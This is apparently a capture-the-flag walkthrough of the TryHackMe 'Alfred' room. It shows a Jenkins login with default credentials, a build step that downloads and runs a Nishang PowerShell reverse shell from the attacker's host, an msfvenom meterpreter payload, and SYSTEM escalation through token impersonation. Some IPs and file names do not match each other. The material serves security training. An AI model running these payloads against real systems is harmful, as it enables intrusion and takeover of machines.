# Alfred

**Room Link:** [https://tryhackme.com/room/alfred](https://tryhackme.com/room/alfred)

### Initial Access

wget [https://raw.githubusercontent.com/samratashok/nishang/master/Shells/Invoke-PowerShellTcp.ps1](https://raw.githubusercontent.com/samratashok/nishang/master/Shells/Invoke-PowerShellTcp.ps1)&#x20;

Edit the file and add the following to the end of the file. This is just to make it a bit easier when we use it later.

```
Invoke-PowerShellTcp -Reverse -IPAddress 10.10.135.134 -Port 4444
```

**How many ports are open? (TCP only)**

```
nmap -A 10.10.98.134
```

**What is the username and password for the log in panel(in the format username:password)**

admin:admin



**Getting shell**

**Kali**

```
rlwrap nc -lvnp 4444
```

**Jenkins**

<figure><img src="../../.gitbook/assets/image (3) (3) (1).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../.gitbook/assets/image (18) (1).png" alt=""><figcaption></figcaption></figure>

Under Build add a build step and select 'Execute Windows batch command' then  add the following in the command field

```
powershell iex (New-Object Net.WebClient).DownloadString('http://10.10.135.134:81/Invoke-PowerShellTcp.ps1'); 
Invoke-PowerShellTcp
```

<figure><img src="../../.gitbook/assets/image (23) (1).png" alt=""><figcaption></figcaption></figure>

&#x20;

<figure><img src="../../.gitbook/assets/image (15) (1).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../.gitbook/assets/image (13) (1) (1).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../.gitbook/assets/image (14) (2) (1).png" alt=""><figcaption></figcaption></figure>

### Switching Shells

**Kali**&#x20;

```
msfvenom -p windows/meterpreter/reverse_tcp -a x86 --encoder x86/shikata_ga_nai LHOST=10.10.135.134 LPORT=1337 -f exe -o shell.exe
python2 -m SimpleHTTPServer 81
```

**Kali**&#x20;

```
msfconsole
use exploit/multi/handler 
set PAYLOAD windows/meterpreter/reverse_tcp 
set LHOST 10.10.135.134 
set LPORT 1337 
run
```

**Victim**&#x20;

```
powershell "(New-Object System.Net.WebClient).Downloadfile('http://10.9.8.234:81/shells.exe','shells.exe')"
Start-Process "shell.exe"
```

<figure><img src="../../.gitbook/assets/image (11) (2) (1).png" alt=""><figcaption></figcaption></figure>

### **Privilege Escalation**

**Victim (Metasploit)**&#x20;

```
load incognito 
list_tokens -g
```

![](<../../.gitbook/assets/image (17) (1).png>)

```
impersonate_token "BUILTIN\Administrators" 
getuid
```

We are now NT Authority&#x20;

<figure><img src="../../.gitbook/assets/image (16) (1).png" alt=""><figcaption></figcaption></figure>

Migrating processes to make sure we have correct permissions for the privileged user. The safest process to pick is the services.exe process

```
ps
migrate 668
```

<figure><img src="../../.gitbook/assets/image (2) (2) (1).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../.gitbook/assets/image (6) (3) (1).png" alt=""><figcaption></figcaption></figure>
